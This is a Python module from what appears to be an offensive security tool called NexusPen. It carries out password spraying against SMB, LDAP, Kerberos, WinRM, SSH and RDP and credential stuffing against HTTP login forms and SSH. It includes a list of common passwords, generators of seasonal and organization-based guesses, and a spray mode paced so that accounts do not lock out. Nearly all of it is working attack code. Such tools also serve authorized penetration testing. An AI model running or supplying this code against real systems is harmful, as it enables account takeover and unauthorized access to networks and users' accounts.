#!/usr/bin/env python3
"""
NexusPen - Password Spraying Module
====================================
Password spraying and credential stuffing attacks.
"""

import subprocess
import time
from typing import Dict, List, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

from rich.console import Console
from rich.progress import Progress

console = Console()


@dataclass
class SprayResult:
    """Spray result."""
    username: str
    password: str
    service: str
    success: bool
    response: Optional[str] = None


class PasswordSprayer:
    """
    Password spraying attacks.
    Tests one password against many users.
    """
    
    # Common passwords for spraying
    COMMON_PASSWORDS = [
        'Password1', 'Password123', 'Welcome1', 'Welcome123',
        'Spring2024', 'Summer2024', 'Fall2024', 'Winter2024',
        'Company1', 'Company123', 'Passw0rd', 'P@ssw0rd',
        'Admin123', 'Qwerty123', 'Password!', 'Welcome!',
        'Changeme1', 'Letmein1', '123456', 'password',
        'Monday1', 'Tuesday1', 'January2024', 'February2024',
    ]
    
    def __init__(self, target: str, domain: str = None):
        self.target = target
        self.domain = domain
        self.results: List[SprayResult] = []
    
    def spray_smb(self, users: List[str], password: str) -> List[SprayResult]:
        """Spray password against SMB."""
        console.print(f"\n[cyan]🔐 SMB password spray: {password}[/cyan]")
        
        results = []
        
        for user in users:
            try:
                if self.domain:
                    full_user = f'{self.domain}/{user}'
                else:
                    full_user = user
                
                result = subprocess.run(
                    ['smbclient', '-L', self.target, '-U', f'{full_user}%{password}'],
                    capture_output=True, text=True, timeout=10
                )
                
                if 'NT_STATUS_LOGON_FAILURE' not in result.stderr:
                    spray_result = SprayResult(
                        username=user,
                        password=password,
                        service='SMB',
                        success=True
                    )
                    results.append(spray_result)
                    self.results.append(spray_result)
                    console.print(f"[green]  ✓ {user}:{password}[/green]")
                    
            except:
                pass
        
        return results
    
    def spray_ldap(self, users: List[str], password: str) -> List[SprayResult]:
        """Spray password against LDAP."""
        console.print(f"\n[cyan]🔐 LDAP password spray: {password}[/cyan]")
        
        results = []
        
        for user in users:
            try:
                if self.domain:
                    bind_dn = f'{user}@{self.domain}'
                else:
                    bind_dn = user
                
                result = subprocess.run(
                    ['ldapsearch', '-x', '-H', f'ldap://{self.target}',
                     '-D', bind_dn, '-w', password, '-b', '', '-s', 'base'],
                    capture_output=True, text=True, timeout=10
                )
                
                if result.returncode == 0:
                    spray_result = SprayResult(
                        username=user,
                        password=password,
                        service='LDAP',
                        success=True
                    )
                    results.append(spray_result)
                    self.results.append(spray_result)
                    console.print(f"[green]  ✓ {user}:{password}[/green]")
                    
            except:
                pass
        
        return results
    
    def spray_kerberos(self, users: List[str], password: str) -> List[SprayResult]:
        """Spray password via Kerberos pre-auth."""
        console.print(f"\n[cyan]🔐 Kerberos password spray: {password}[/cyan]")
        
        results = []
        
        # Using kerbrute
        # Create temp user file
        user_file = '/tmp/spray_users.txt'
        with open(user_file, 'w') as f:
            f.write('\n'.join(users))
        
        try:
            result = subprocess.run(
                ['kerbrute', 'passwordspray', '-d', self.domain,
                 '--dc', self.target, user_file, password],
                capture_output=True, text=True, timeout=120
            )
            
            for line in result.stdout.split('\n'):
                if 'VALID' in line:
                    # Extract username
                    parts = line.split()
                    for part in parts:
                        if '@' in part:
                            user = part.split('@')[0]
                            spray_result = SprayResult(
                                username=user,
                                password=password,
                                service='Kerberos',
                                success=True
                            )
                            results.append(spray_result)
                            self.results.append(spray_result)
                            console.print(f"[green]  ✓ {user}:{password}[/green]")
                            break
                            
        except FileNotFoundError:
            console.print("[yellow]kerbrute not found, using alternative method[/yellow]")
        except:
            pass
        
        return results
    
    def spray_with_crackmapexec(self, users: List[str], password: str,
                                protocol: str = 'smb') -> List[SprayResult]:
        """Spray using CrackMapExec."""
        console.print(f"\n[cyan]🔐 CME {protocol.upper()} spray: {password}[/cyan]")
        
        results = []
        
        user_file = '/tmp/spray_users.txt'
        with open(user_file, 'w') as f:
            f.write('\n'.join(users))
        
        try:
            cmd = ['crackmapexec', protocol, self.target,
                   '-u', user_file, '-p', password]
            
            if self.domain:
                cmd.extend(['-d', self.domain])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            for line in result.stdout.split('\n'):
                if '(Pwn3d!)' in line or '[+]' in line:
                    # Parse successful login
                    spray_result = SprayResult(
                        username='parsed_from_output',
                        password=password,
                        service=f'CME-{protocol}',
                        success=True,
                        response=line
                    )
                    results.append(spray_result)
                    console.print(f"[green]  ✓ {line}[/green]")
                    
        except:
            pass
        
        return results
    
    def spray_winrm(self, users: List[str], password: str) -> List[SprayResult]:
        """Spray against WinRM."""
        console.print(f"\n[cyan]🔐 WinRM password spray: {password}[/cyan]")
        
        return self.spray_with_crackmapexec(users, password, 'winrm')
    
    def spray_ssh(self, users: List[str], password: str) -> List[SprayResult]:
        """Spray against SSH."""
        console.print(f"\n[cyan]🔐 SSH password spray: {password}[/cyan]")
        
        return self.spray_with_crackmapexec(users, password, 'ssh')
    
    def spray_rdp(self, users: List[str], password: str) -> List[SprayResult]:
        """Spray against RDP."""
        console.print(f"\n[cyan]🔐 RDP password spray: {password}[/cyan]")
        
        return self.spray_with_crackmapexec(users, password, 'rdp')
    
    def smart_spray(self, users: List[str], passwords: List[str] = None,
                   delay: int = 30, protocol: str = 'smb') -> List[SprayResult]:
        """
        Smart password spray with lockout avoidance.
        
        Args:
            users: List of usernames
            passwords: Passwords to try (defaults to common list)
            delay: Delay between attempts (default 30 seconds)
            protocol: Target protocol
        """
        console.print("\n[bold red]═══════════════════════════════════════════════════════════[/bold red]")
        console.print("[bold red]              SMART PASSWORD SPRAY                          [/bold red]")
        console.print("[bold red]═══════════════════════════════════════════════════════════[/bold red]")
        
        passwords = passwords or self.COMMON_PASSWORDS
        
        console.print(f"[cyan]Target: {self.target}[/cyan]")
        console.print(f"[cyan]Users: {len(users)}[/cyan]")
        console.print(f"[cyan]Passwords: {len(passwords)}[/cyan]")
        console.print(f"[cyan]Delay between sprays: {delay}s[/cyan]")
        
        all_results = []
        
        for i, password in enumerate(passwords):
            console.print(f"\n[yellow]━━━ Spray {i+1}/{len(passwords)}: {password} ━━━[/yellow]")
            
            if protocol == 'smb':
                results = self.spray_smb(users, password)
            elif protocol == 'ldap':
                results = self.spray_ldap(users, password)
            elif protocol == 'kerberos':
                results = self.spray_kerberos(users, password)
            elif protocol == 'winrm':
                results = self.spray_winrm(users, password)
            elif protocol == 'ssh':
                results = self.spray_ssh(users, password)
            elif protocol == 'rdp':
                results = self.spray_rdp(users, password)
            else:
                results = self.spray_with_crackmapexec(users, password, protocol)
            
            all_results.extend(results)
            
            # Early exit if credentials found
            if results:
                console.print(f"[green]✓ Found {len(results)} valid credentials![/green]")
            
            # Delay to avoid lockout
            if i < len(passwords) - 1 and delay > 0:
                console.print(f"[dim]Waiting {delay}s to avoid lockout...[/dim]")
                time.sleep(delay)
        
        return all_results
    
    def display_results(self):
        """Display all spray results."""
        if not self.results:
            console.print("\n[yellow]No valid credentials found[/yellow]")
            return
        
        from rich.table import Table
        table = Table(title="Valid Credentials Found", show_header=True,
                     header_style="bold green")
        table.add_column("Username", style="cyan")
        table.add_column("Password", style="yellow")
        table.add_column("Service", style="white")
        
        for r in self.results:
            table.add_row(r.username, r.password, r.service)
        
        console.print(table)


class CredentialStuffer:
    """
    Credential stuffing attacks.
    Tests leaked credential pairs.
    """
    
    def __init__(self, target: str):
        self.target = target
        self.results: List[SprayResult] = []
    
    def load_credentials(self, file_path: str, delimiter: str = ':') -> List[tuple]:
        """Load credential pairs from file."""
        credentials = []
        
        try:
            with open(file_path, 'r', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if delimiter in line:
                        parts = line.split(delimiter, 1)
                        if len(parts) == 2:
                            credentials.append((parts[0], parts[1]))
        except Exception as e:
            console.print(f"[red]Error loading credentials: {e}[/red]")
        
        return credentials
    
    def stuff_http_form(self, credentials: List[tuple], url: str,
                       username_field: str = 'username',
                       password_field: str = 'password',
                       success_indicator: str = 'dashboard') -> List[SprayResult]:
        """Credential stuffing against HTTP form."""
        console.print(f"\n[cyan]🔐 HTTP credential stuffing...[/cyan]")
        
        import requests
        
        results = []
        
        for username, password in credentials:
            try:
                response = requests.post(
                    url,
                    data={username_field: username, password_field: password},
                    timeout=10,
                    allow_redirects=True
                )
                
                if success_indicator.lower() in response.text.lower():
                    result = SprayResult(
                        username=username,
                        password=password,
                        service='HTTP',
                        success=True
                    )
                    results.append(result)
                    self.results.append(result)
                    console.print(f"[green]  ✓ {username}:{password}[/green]")
                    
            except:
                pass
        
        return results
    
    def stuff_ssh(self, credentials: List[tuple]) -> List[SprayResult]:
        """Credential stuffing against SSH."""
        console.print(f"\n[cyan]🔐 SSH credential stuffing...[/cyan]")
        
        results = []
        
        for username, password in credentials:
            try:
                result = subprocess.run(
                    ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no',
                     '-o', 'ConnectTimeout=5', f'{username}@{self.target}', 'echo success'],
                    capture_output=True, text=True, timeout=10
                )
                
                if 'success' in result.stdout:
                    spray_result = SprayResult(
                        username=username,
                        password=password,
                        service='SSH',
                        success=True
                    )
                    results.append(spray_result)
                    self.results.append(spray_result)
                    console.print(f"[green]  ✓ {username}:{password}[/green]")
                    
            except:
                pass
        
        return results


class SeasonalPasswordGenerator:
    """
    Generate seasonal and organization-specific passwords.
    """
    
    @staticmethod
    def generate_seasonal(year: int = 2024) -> List[str]:
        """Generate seasonal passwords."""
        seasons = ['Spring', 'Summer', 'Fall', 'Winter', 'Autumn']
        months = ['January', 'February', 'March', 'April', 'May', 'June',
                  'July', 'August', 'September', 'October', 'November', 'December']
        
        passwords = []
        
        for season in seasons:
            passwords.extend([
                f'{season}{year}', f'{season}{year}!',
                f'{season}{year}#', f'{season}{year}@',
                f'{season.lower()}{year}',
            ])
        
        for month in months:
            passwords.extend([
                f'{month}{year}', f'{month}{year}!',
                f'{month.lower()}{year}',
            ])
        
        return passwords
    
    @staticmethod
    def generate_org_passwords(org_name: str, year: int = 2024) -> List[str]:
        """Generate organization-specific passwords."""
        variations = [
            f'{org_name}1', f'{org_name}123', f'{org_name}!',
            f'{org_name}@123', f'{org_name}{year}',
            f'{org_name}{year}!', f'{org_name}#1',
            f'Welcome{org_name}', f'{org_name}Pass',
            f'{org_name}@{year}', f'P@ss{org_name}',
        ]
        
        # Add lowercase/title variations
        result = []
        for v in variations:
            result.extend([v, v.lower(), v.title()])
        
        return list(set(result))
    
    @staticmethod
    def generate_common_patterns() -> List[str]:
        """Generate common password patterns."""
        return [
            'Password1', 'Password123', 'Password!', 'P@ssw0rd',
            'Passw0rd!', 'Welcome1', 'Welcome123', 'Welcome!',
            'Admin123', 'Admin!', 'Qwerty123', 'Letmein1',
            'Changeme1', 'Changeme!', 'Company1', 'Company123',
            'Monday1', 'Friday1', 'Hello123', 'Test123',
            '123456', '12345678', 'password', 'qwerty',
        ]
